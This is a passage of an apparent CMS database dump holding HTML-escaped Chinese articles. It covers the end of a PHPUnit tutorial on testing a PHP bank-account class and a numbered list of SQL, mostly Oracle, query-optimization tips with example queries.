transferFrom(&amp;amp;$sourceAccount,$amount){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$sourceAccount-&amp;gt;withdraw($amount);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;deposit($amount);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;创建一个测试类&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;首先，我们建立一个测试类AccountTest，它是一个由PhpUnit提供的TestCase的子类。在这个TestCase类中有2个基本的方法：setUp和tearDown。 这2个方法的实现在父类中是空过程，必须由我们自己去重载。其中SetUp 用于进行AccountTest类的初始化处理。在本例中，我们对一些在测试中用到的账号进行初始化。tearDown 则用于AccountTest类的清空处理，在本例中无需使用。因此，就不对它进行重载。这样AccountTester类的源代码如下：&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;class AccountTester extends TestCase{&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;var $_ac1;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;var $_ac2;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;var $_ac3;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;var $_ac4;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function AccountTester($name){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;TestCase($name); // call parent constructor&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function setUp(){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;_ac1 = new Account(100); // data for testWithdraw&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;_ac2 = new Account(20); // data for testDeposit&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;_ac3 = new Account(30); // data for testTransferFrom&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;_ac4 = new Account(50);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;加入专门的测试代码&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;现在，我们可以往向AccountTester类加入测试代码了。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;// Make a withdrawal of 25 units from _ac1.&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;// _ac1''s initial balance is 100&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function testWithdraw(){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;_ac1-&amp;gt;withdraw(25);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;assert($this-&amp;gt;_ac1-&amp;gt;getBalance() == 75); // 100 - 25 = 75&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;// Make a deposit of 10 units into _ac2.&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;// _ac1''s initial balance is 20&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function testDeposit(){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;_ac2-&amp;gt;deposit(10);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;assertEquals(30,$this-&amp;gt;_ac2-&amp;gt;getBalance()); //20 +10 = 30&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;// Tranfers 10 units from _ac3 to _ac4&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;// _ac3''s initial balance is 30&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;// _ac4''s initial balance is 50&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function testTransferFrom(){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;_ac4-&amp;gt;transferFrom(&amp;amp;$this-&amp;gt;_ac3,10);&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;assertEquals(20,$this-&amp;gt;_ac3-&amp;gt;getBalance(),&quot;Source account balance incorrect&quot;); // 30 - 10 = 20&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;assertEquals(60,$this-&amp;gt;_ac4-&amp;gt;getBalance(),&quot;Target account balance incorrect&quot;); // 50 + 10 = 60&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;这段代码中，assert（如同C里的断言）方法是测试的关键部分。如果在assert中的条件表达式为真，那么测试通过。否则返回错误。由于assert方法大都用于判断两个变量的值是否相等。因此，testclass类引入了assertEquals方法专门实现这个功能。AssertEquals方法中有3个参数，依次分别为：期望值，测试值，两值不相等时返回的消息提示串。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;运行测试过程&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;好了，现在可以运行一下我们编好的测试程序了。我们还必须建立一个runtest.php测试程序来运行所有的测试过程。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;runtest.php源代码如下：&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$tSuite = new TestSuite(); //creation of the test suite object 创建测试套件对象&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$tSuite-&amp;gt;addtest(new AccountTester(&quot;testWithdraw&quot;)); //Add inidividual tests&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$tSuite-&amp;gt;addtest(new AccountTester(&quot;testDeposit&quot;)); //加入专门测试方法。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$tSuite-&amp;gt;addtest(new AccountTester(&quot;testTransferFrom&quot;));&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$res = new TextTestResult(); //Creation of the Result 建立一个测试结果类&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$tSuite-&amp;gt;run(&amp;amp;$res); //Run of the test 运行测试&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$res-&amp;gt;report(); //Print results 输出测试结果。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;程序说明：&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;首先创建测试套件对象tSuite，然后逐一加入专门测试方法，addtest方法的参数是测试方法的 再创建测试报告对象，随之运行测试。测试发现错误的结果由TestResult类捕捉，TestResult可以定制一套text/html的错误报告。如果有必要你也可以自己编写输出部分。测试结果封装在TestResult类中，为了输出测试结果。我们采用了phpUnit提供的另外一个类TextTestResult类，它可以输出文本或超文本格式的报告。当然我们也可以自己定制一个新的TestResult的子类控制更复杂的输出格式。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;　&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;提示和技巧&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;1、在编写一个新的测试套件完成之后，我们可以先引入一个小小的bug以证明测试套件可以正常运行。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;比如，在本例account类中，我们故意引入一个有问题的函数。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;&amp;lt;?php&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;function withdraw($amount){&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;$this-&amp;gt;balance -= $Amount;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;// 变量名大小写错误，本意是调用$amount参数，结果引入一个新变量$Amount。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;}&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;?&amp;gt;&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;好，现在让我们运行测试套件，如果不出意外的话，我们将很快发现错误之处。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;2．要指出的是，并非所有的方法都需要测试。你只需对相关的方法进行测试。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;3．如果在开始编码前就写好测试代码，会使你更进一步明白你的程序到底需要完成什么样的任务。&amp;nbsp;&lt;/div&gt;\r\n&lt;div&gt;现在，通过引入phpUnit的测试套件类，你可以发现找bug的时间缩短了，而你作为一个程序员的工作效率也提高了。&amp;nbsp;&lt;/div&gt;\r\n', 1, 1, 0, 0, 1303622716, 1, 'admin'),
(81, 1, 'SQL优化34条mysql', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:verdana, sans-serif;font-size:14px;line-height:21px;&quot;&gt;&lt;p style=&quot;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:1em;margin-right:0px;margin-bottom:0.5em;margin-left:0px;&quot;&gt;我们要做到不但会写SQL,还要做到写出性能优良的SQL,以下为笔者学习、摘录、并汇总部分资料与大家分享！&amp;nbsp;&lt;br /&gt;\r\n（1）&amp;nbsp; &amp;nbsp; &amp;nbsp; 选择最有效率的表名顺序(只在基于规则的优化器中有效)：&amp;nbsp;&lt;br /&gt;\r\nORACLE 的解析器按照从右到左的顺序处理FROM子句中的表名，FROM子句中写在最后的表(基础表 driving table)将被最先处理，在FROM子句中包含多个表的情况下,你必须选择记录条数最少的表作为基础表。如果有3个以上的表连接查询, 那就需要选择交叉表(intersection table)作为基础表, 交叉表是指那个被其他表所引用的表.&amp;nbsp;&lt;br /&gt;\r\n（2）&amp;nbsp; &amp;nbsp; &amp;nbsp; WHERE子句中的连接顺序．：&amp;nbsp;&lt;br /&gt;\r\nORACLE采用自下而上的顺序解析WHERE子句,根据这个原理,表之间的连接必须写在其他WHERE条件之前, 那些可以过滤掉最大数量记录的条件必须写在WHERE子句的末尾.&amp;nbsp;&lt;br /&gt;\r\n（3）&amp;nbsp; &amp;nbsp; &amp;nbsp; SELECT子句中避免使用 ‘ * ‘：&amp;nbsp;&lt;br /&gt;\r\nORACLE在解析的过程中, 会将''*'' 依次转换成所有的列名, 这个工作是通过查询数据字典完成的, 这意味着将耗费更多的时间&amp;nbsp;&lt;br /&gt;\r\n（4）&amp;nbsp; &amp;nbsp; &amp;nbsp; 减少访问数据库的次数：&amp;nbsp;&lt;br /&gt;\r\nORACLE在内部执行了许多工作: 解析SQL语句, 估算索引的利用率, 绑定变量 , 读数据块等；&amp;nbsp;&lt;br /&gt;\r\n（5）&amp;nbsp; &amp;nbsp; &amp;nbsp; 在SQL*Plus , SQL*Forms和Pro*C中重新设置ARRAYSIZE参数, 可以增加每次数据库访问的检索数据量 ,建议值为200&amp;nbsp;&lt;br /&gt;\r\n（6）&amp;nbsp; &amp;nbsp; &amp;nbsp; 使用DECODE函数来减少处理时间：&amp;nbsp;&lt;br /&gt;\r\n使用DECODE函数可以避免重复扫描相同记录或重复连接相同的表.&amp;nbsp;&lt;br /&gt;\r\n（7）&amp;nbsp; &amp;nbsp; &amp;nbsp; 整合简单,无关联的数据库访问：&amp;nbsp;&lt;br /&gt;\r\n如果你有几个简单的数据库查询语句,你可以把它们整合到一个查询中(即使它们之间没有关系)&amp;nbsp;&lt;br /&gt;\r\n（8）&amp;nbsp; &amp;nbsp; &amp;nbsp; 删除重复记录：&amp;nbsp;&lt;br /&gt;\r\n最高效的删除重复记录方法 ( 因为使用了ROWID)例子：&amp;nbsp;&lt;br /&gt;\r\nDELETE&amp;nbsp; FROM&amp;nbsp; EMP E&amp;nbsp; WHERE&amp;nbsp; E.ROWID &amp;gt; (SELECT MIN(X.ROWID)&amp;nbsp;&lt;br /&gt;\r\nFROM&amp;nbsp; EMP X&amp;nbsp; WHERE&amp;nbsp; X.EMP_NO = E.EMP_NO);&amp;nbsp;&lt;br /&gt;\r\n（9）&amp;nbsp; &amp;nbsp; &amp;nbsp; 用TRUNCATE替代DELETE：&amp;nbsp;&lt;br /&gt;\r\n当删除表中的记录时,在通常情况下, 回滚段(rollback segments ) 用来存放可以被恢复的信息. 如果你没有COMMIT事务,ORACLE会将数据恢复到删除之前的状态(准确地说是恢复到执行删除命令之前的状况) 而当运用TRUNCATE时, 回滚段不再存放任何可被恢复的信息.当命令运行后,数据不能被恢复.因此很少的资源被调用,执行时间也会很短. (译者按: TRUNCATE只在删除全表适用,TRUNCATE是DDL不是DML)&amp;nbsp;&lt;br /&gt;\r\n（10） 尽量多使用COMMIT：&amp;nbsp;&lt;br /&gt;\r\n只要有可能,在程序中尽量多使用COMMIT, 这样程序的性能得到提高,需求也会因为COMMIT所释放的资源而减少:&amp;nbsp;&lt;br /&gt;\r\nCOMMIT所释放的资源:&amp;nbsp;&lt;br /&gt;\r\na. 回滚段上用于恢复数据的信息.&amp;nbsp;&lt;br /&gt;\r\nb. 被程序语句获得的锁&amp;nbsp;&lt;br /&gt;\r\nc. redo log buffer 中的空间&amp;nbsp;&lt;br /&gt;\r\nd. ORACLE为管理上述3种资源中的内部花费&amp;nbsp;&lt;br /&gt;\r\n（11） 用Where子句替换HAVING子句：&amp;nbsp;&lt;br /&gt;\r\n避免使用HAVING子句, HAVING 只会在检索出所有记录之后才对结果集进行过滤. 这个处理需要排序,总计等操作. 如果能通过WHERE子句限制记录的数目,那就能减少这方面的开销. (非oracle中)on、where、having这三个都可以加条件的子句中，on是最先执行，where次之，having最后，因为on是先把不符合条件的记录过滤后才进行统计，它就可以减少中间运算要处理的数据，按理说应该速度是最快的，where也应该比having快点的，因为它过滤数据后才进行sum，在两个表联接时才用on的，所以在一个表的时候，就剩下where跟having比较了。在这单表查询统计的情况下，如果要过滤的条件没有涉及到要计算字段，那它们的结果是一样的，只是where可以使用rushmore技术，而having就不能，在速度上后者要慢如果要涉及到计算的字段，就表示在没计算之前，这个字段的值是不确定的，根据上篇写的工作流程，where的作用时间是在计算之前就完成的，而having就是在计算后才起作用的，所以在这种情况下，两者的结果会不同。在多表联接查询时，on比where更早起作用。系统首先根据各个表之间的联接条件，把多个表合成一个临时表后，再由where进行过滤，然后再计算，计算完后再由having进行过滤。由此可见，要想过滤条件起到正确的作用，首先要明白这个条件应该在什么时候起作用，然后再决定放在那里&amp;nbsp;&lt;br /&gt;\r\n（12） 减少对表的查询：&amp;nbsp;&lt;br /&gt;\r\n在含有子查询的SQL语句中,要特别注意减少对表的查询.例子：&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; SELECT&amp;nbsp; TAB_NAME FROM TABLES WHERE (TAB_NAME,DB_VER) = ( SELECT&amp;nbsp;&lt;br /&gt;\r\nTAB_NAME,DB_VER FROM&amp;nbsp; TAB_COLUMNS&amp;nbsp; WHERE&amp;nbsp; VERSION = 604)&amp;nbsp;&lt;br /&gt;\r\n（13） 通过内部函数提高SQL效率.：&amp;nbsp;&lt;br /&gt;\r\n复杂的SQL往往牺牲了执行效率. 能够掌握上面的运用函数解决问题的方法在实际工作中是非常有意义的&amp;nbsp;&lt;br /&gt;\r\n（14） 使用表的别名(Alias)：&amp;nbsp;&lt;br /&gt;\r\n当在SQL语句中连接多个表时, 请使用表的别名并把别名前缀于每个Column上.这样一来,就可以减少解析的时间并减少那些由Column歧义引起的语法错误.&amp;nbsp;&lt;br /&gt;\r\n（15） 用EXISTS替代IN、用NOT EXISTS替代NOT IN：&amp;nbsp;&lt;br /&gt;\r\n在许多基于基础表的查询中,为了满足一个条件,往往需要对另一个表进行联接.在这种情况下, 使用EXISTS(或NOT EXISTS)通常将提高查询的效率. 在子查询中,NOT IN子句将执行一个内部的排序和合并. 无论在哪种情况下,NOT IN都是最低效的 (因为它对子查询中的表执行了一个全表遍历). 为了避免使用NOT IN ,我们可以把它改写成外连接(Outer Joins)或NOT EXISTS.&amp;nbsp;&lt;br /&gt;\r\n例子：&amp;nbsp;&lt;br /&gt;\r\n（高效）SELECT * FROM&amp;nbsp; EMP (基础表)&amp;nbsp; WHERE&amp;nbsp; EMPNO &amp;gt; 0&amp;nbsp; AND&amp;nbsp; EXISTS (SELECT ‘X''&amp;nbsp; FROM DEPT&amp;nbsp; WHERE&amp;nbsp; DEPT.DEPTNO = EMP.DEPTNO&amp;nbsp; AND&amp;nbsp; LOC = ‘MELB'')&amp;nbsp;&lt;br /&gt;\r\n(低效)SELECT&amp;nbsp; * FROM&amp;nbsp; EMP (基础表)&amp;nbsp; WHERE&amp;nbsp; EMPNO &amp;gt; 0&amp;nbsp; AND&amp;nbsp; DEPTNO IN(SELECT DEPTNO&amp;nbsp; FROM&amp;nbsp; DEPT&amp;nbsp; WHERE&amp;nbsp; LOC = ‘MELB'')&amp;nbsp;&lt;br /&gt;\r\n（16） 识别''低效执行''的SQL语句：&amp;nbsp;&lt;br /&gt;\r\n虽然目前各种关于SQL优化的图形化工具层出不穷,但是写出自己的SQL工具来解决问题始终是一个最好的方法：&amp;nbsp;&lt;br /&gt;\r\nSELECT&amp;nbsp; EXECUTIONS , DISK_READS, BUFFER_GETS,&amp;nbsp;&lt;br /&gt;\r\nROUND((BUFFER_GETS-DISK_READS)/BUFFER_GETS,2) Hit_radio,&amp;nbsp;&lt;br /&gt;\r\nROUND(DISK_READS/EXECUTIONS,2) Reads_per_run,&amp;nbsp;&lt;br /&gt;\r\nSQL_TEXT&amp;nbsp;&lt;br /&gt;\r\nFROM&amp;nbsp; V$SQLAREA&amp;nbsp;&lt;br /&gt;\r\nWHERE&amp;nbsp; EXECUTIONS&amp;gt;0&amp;nbsp;&lt;br /&gt;\r\nAND&amp;nbsp; BUFFER_GETS &amp;gt; 0&amp;nbsp;&lt;br /&gt;\r\nAND&amp;nbsp; (BUFFER_GETS-DISK_READS)/BUFFER_GETS &amp;lt; 0.8&amp;nbsp;&lt;br /&gt;\r\nORDER BY&amp;nbsp; 4 DESC;&lt;/p&gt;\r\n&lt;p style=&quot;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:1em;margin-right:0px;margin-bottom:0.5em;margin-left:0px;&quot;&gt;（17） 用索引提高效率：&amp;nbsp;&lt;br /&gt;\r\n索引是表的一个概念部分,用来提高检索数据的效率，ORACLE使用了一个复杂的自平衡B-tree结构. 通常,通过索引查询数据比全表扫描要快. 当ORACLE找出执行查询和Update语句的最佳路径时, ORACLE优化器将使用索引. 同样在联结多个表时使用索引也可以提高效率. 另一个使用索引的好处是,它提供了主键(primary key)的唯一性验证.。那些LONG或LONG RAW数据类型, 你可以索引几乎所有的列. 通常, 在大型表中使用索引特别有效. 当然,你也会发现, 在扫描小表时,使用索引同样能提高效率. 虽然使用索引能得到查询效率的提高,但是我们也必须注意到它的代价. 索引需要空间来存储,也需要定期维护, 每当有记录在表中增减或索引列被修改时, 索引本身也会被修改. 这意味着每条记录的INSERT , DELETE , UPDATE将为此多付出4 , 5 次的磁盘I/O . 因为索引需要额外的存储空间和处理,那些不必要的索引反而会使查询反应时间变慢.。定期的重构索引是有必要的.：&amp;nbsp;&lt;br /&gt;\r\nALTER&amp;nbsp; INDEX &amp;lt;INDEXNAME&amp;gt; REBUILD &amp;lt;TABLESPACENAME&amp;gt;&amp;nbsp;&lt;br /&gt;\r\n18） 用EXISTS替换DISTINCT：&amp;nbsp;&lt;br /&gt;\r\n当提交一个包含一对多表信息(比如部门表和雇员表)的查询时,避免在SELECT子句中使用DISTINCT. 一般可以考虑用EXIST替换, EXISTS 使查询更为迅速,因为RDBMS核心模块将在子查询的条件一旦满足后,立刻返回结果. 例子：&amp;nbsp;&lt;br /&gt;\r\n&amp;nbsp; &amp;nbsp; &amp;nbsp; (低效):&amp;nbsp;&lt;br /&gt;\r\nSELECT&amp;nbsp; DISTINCT&amp;nbsp; DEPT_NO,DEPT_NAME&amp;nbsp; FROM&amp;nbsp; DEPT D , EMP E&amp;nbsp;&lt;br /&gt;\r\nWHERE&amp;nbsp; D.DEPT_NO = E.DEPT_NO&amp;nbsp;&lt;br /&gt;\r\n(高效):&amp;nbsp;&lt;br /&gt;\r\nSELECT&amp;nbsp; DEPT_NO,DEPT_NAME&amp;nbsp; FROM&amp;nbsp; DEPT D&amp;nbsp; WHERE&amp;nbsp; EXISTS ( SELECT ‘X''&amp;nbsp;&lt;br /&gt;\r\nFROM&amp;nbsp; EMP E&amp;nbsp; WHERE E.DEPT_NO = D.DEPT_NO);&amp;nbsp;&lt;br /&gt;\r\n（19） sql语句用大写的；因为oracle总是先解析sql语句，把小写的字母转换成大写的再执行&amp;nbsp;&lt;br /&gt;\r\n（20） 在java代码中尽量少用连接符“＋”连接字符串！&amp;nbsp;&lt;br /&gt;\r\n（21） 避免在索引列上使用NOT 通常，　&amp;nbsp;&lt;br /&gt;\r\n我们要避免在索引列上使用NOT, NOT会产生在和在索引列上使用函数相同的影响. 当ORACLE”遇到”NOT,他就会停止使用索引转而执行全表扫描.&amp;nbsp;&lt;br /&gt;\r\n（22） 避免在索引列上使用计算．&amp;nbsp;&lt;br /&gt;\r\nWHERE子句中，如果索引列是函数的一部分．优化器将不使用索引而使用全表扫描．&amp;nbsp;&lt;br /&gt;\r\n举例:&amp;nbsp;&lt;br /&gt;\r\n低效：&amp;nbsp;&lt;br /&gt;\r\nSELECT … FROM&amp;nbsp; DEPT&amp;nbsp; WHERE SAL * 12 &amp;gt; 25000;&amp;nbsp;&lt;br /&gt;\r\n高效:&amp;nbsp;&lt;br /&gt;\r\nSELECT … FROM DEPT WHERE SAL &amp;gt; 25000/12;&amp;nbsp;&lt;br /&gt;\r\n（23） 用&amp;gt;=替代&amp;gt;&amp;nbsp;&lt;br /&gt;\r\n高效:&amp;nbsp;&lt;br /&gt;\r\nSELECT * FROM&amp;nbsp; EMP&amp;nbsp; WHERE&amp;nbsp; DEPTNO &amp;gt;=4&amp;nbsp;&lt;br /&gt;\r\n低效:&amp;nbsp;&lt;br /&gt;\r\nSELECT * FROM EMP WHERE DEPTNO &amp;gt;3&amp;nbsp;&lt;br /&gt;\r\n两者的区别在于, 前者DBMS将直接跳到第一个DEPT等于4的记录而后者将首先定位到DEPTNO=3的记录并且向前扫描到第一个DEPT大于3的记录.&amp;nbsp;&lt;br /&gt;\r\n（24） 用UNION替换OR (适用于索引列)&amp;nbsp;&lt;br /&gt;\r\n通常情况下, 用UNION替换WHERE子句中的OR将会起到较好的效果. 对索引列使用OR将造成全表扫描. 注意, 以上规则只针对多个索引列有效. 如果有column没有被索引, 查询效率可能会因为你没有选择OR而降低. 在下面的例子中, LOC_ID 和REGION上都建有索引.&amp;nbsp;&lt;br /&gt;\r\n高效:&amp;nbsp;&lt;br /&gt;\r\nSELECT LOC_ID , LOC_DESC , REGION&amp;nbsp;&lt;br /&gt;\r\nFROM LOCATION&amp;nbsp;&lt;br /&gt;\r\nWHERE LOC_ID = 10&amp;nbsp;&lt;br /&gt;\r\nUNION&amp;nbsp;&lt;br /&gt;\r\nSELECT LOC_ID , LOC_DESC , REGION&amp;nbsp;&lt;br /&gt;\r\nFROM LOCATION&amp;nbsp;&lt;br /&gt;\r\nWHERE REGION = “MELBOURNE”&amp;nbsp;&lt;br /&gt;\r\n低效:&amp;nbsp;&lt;br /&gt;\r\nSELECT LOC_ID , LOC_DESC , REGION&amp;nbsp;&lt;br /&gt;\r\nFROM LOCATION&amp;nbsp;&lt;br /&gt;\r\nWHERE LOC_ID = 10 OR REGION = “MELBOURNE”&amp;nbsp;&lt;br /&gt;\r\n如果你坚持要用OR, 那就需要返回记录最少的索引列写在最前面.&amp;nbsp;&lt;br /&gt;\r\n（25） 用IN来替换OR&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n这是一条简单易记的规则，但是实际的执行效果还须检验，在ORACLE8i下，两者的执行路径似乎是相同的．　&amp;nbsp;&lt;br /&gt;\r\n低效:&amp;nbsp;&lt;br /&gt;\r\nSELECT…. FROM LOCATION WHERE LOC_ID = 10 OR LOC_ID = 20 OR LOC_ID = 30&amp;nbsp;&lt;br /&gt;\r\n高效&amp;nbsp;&lt;br /&gt;\r\nSELECT… FROM LOCATION WHERE LOC_IN&amp;nbsp; IN (10,20,30);&amp;nbsp;&lt;br /&gt;\r\n（26） 避免在索引列上使用IS NULL和IS NOT NULL&amp;nbsp;&lt;br /&gt;\r\n避免在索引中使用任何可以为空的列，ORACLE将无法使用该索引．对于单列索引，如果列包含空值，索引中将不存在此记录. 对于复合索引，如果每个列都为空，索引中同样不存在此记录.　如果至少有一个列不为空，则记录存在于索引中．举例: 如果唯一性索引建立在表的A列和B列上, 并且表中存在一条记录的A,B值为(123,null) , ORACLE将不接受下一条具有相同A,B值（123,null）的记录(插入). 然而如果所有的索引列都为空，ORACLE将认为整个键值为空而空不等于空. 因此你可以插入1000 条具有相同键值的记录,当然它们都是空! 因为空值不存在于索引列中,所以WHERE子句中对索引列进行空值比较将使ORACLE停用该索引.&amp;nbsp;&lt;br /&gt;\r\n低效: (索引失效)&amp;nbsp;&lt;br /&gt;\r\nSELECT … FROM&amp;nbsp; DEPARTMENT&amp;nbsp; WHERE&amp;nbsp; DEPT_CODE IS NOT NULL;&amp;nbsp;&lt;br /&gt;\r\n高效: (索引有效)&amp;nbsp;&lt;br /&gt;\r\nSELECT … FROM&amp;nbsp; DEPARTMENT&amp;nbsp; WHERE&amp;nbsp; DEPT_CODE &amp;gt;=0;&amp;nbsp;&lt;br /&gt;\r\n（27） 总是使用索引的第一个列：&amp;nbsp;&lt;br /&gt;\r\n如果索引是建立在多个列上, 只有在它的第一个列(leading column)被where子句引用时,优化器才会选择使用该索引. 这也是一条简单而重要的规则，当仅引用索引的第二个列时,优化器使用了全表扫描而忽略了索引&amp;nbsp;&lt;br /&gt;\r\n28） 用UNION-ALL 替换UNION ( 如果有可能的话)：&amp;nbsp;&lt;br /&gt;\r\n当SQL 语句需要UNION两个查询结果集合时,这两个结果集合会以UNION-ALL的方式被合并, 然后在输出最终结果前进行排序. 如果用UNION ALL替代UNION, 这样排序就不是必要了. 效率就会因此得到提高. 需要注意的是，UNION ALL 将重复输出两个结果集合中相同记录. 因此各位还是要从业务需求分析使用UNION ALL的可行性. UNION 将对结果集合排序,这个操作会使用到SORT_AREA_SIZE这块内存. 对于这块内存的优化也是相当重要的. 下面的SQL可以用来查询排序的消耗量&amp;nbsp;&lt;br /&gt;\r\n低效：&amp;nbsp;&lt;br /&gt;\r\nSELECT&amp;nbsp; ACCT_NUM, BALANCE_AMT&amp;nbsp;&lt;br /&gt;\r\nFROM&amp;nbsp; DEBIT_TRANSACTIONS&amp;nbsp;&lt;br /&gt;\r\nWHERE TRAN_DATE = ''31-DEC-95''&amp;nbsp;&lt;br /&gt;\r\nUNION&amp;nbsp;&lt;br /&gt;\r\nSELECT ACCT_NUM, BALANCE_AMT&amp;nbsp;&lt;br /&gt;\r\nFROM DEBIT_TRANSACTIONS&amp;nbsp;&lt;br /&gt;\r\nWHERE TRAN_DATE = ''31-DEC-95''&amp;nbsp;&lt;br /&gt;\r\n高效:&amp;nbsp;&lt;br /&gt;\r\nSELECT ACCT_NUM, BALANCE_AMT&amp;nbsp;&lt;br /&gt;\r\nFROM DEBIT_TRANSACTIONS&amp;nbsp;&lt;br /&gt;\r\nWHERE TRAN_DATE = ''31-DEC-95''&amp;nbsp;&lt;br /&gt;\r\nUNION ALL&amp;nbsp;&lt;br /&gt;\r\nSELECT ACCT_NUM, BALANCE_AMT&amp;nbsp;&lt;br /&gt;\r\nFROM DEBIT_TRANSACTIONS&amp;nbsp;&lt;br /&gt;\r\nWHERE TRAN_DATE = ''31-DEC-95''&amp;nbsp;&lt;br /&gt;\r\n（29） 用WHERE替代ORDER BY：&amp;nbsp;&lt;br /&gt;\r\nORDER BY 子句只在两种严格的条件下使用索引.&amp;nbsp;&lt;br /&gt;\r\nORDER BY中所有的列必须包含在相同的索引中并保持在索引中的排列顺序.&amp;nbsp;&lt;br /&gt;\r\nORDER BY中所有的列必须定义为非空.&amp;nbsp;&lt;br /&gt;\r\nWHERE子句使用的索引和ORDER BY子句中所使用的索引不能并列.&amp;nbsp;&lt;br 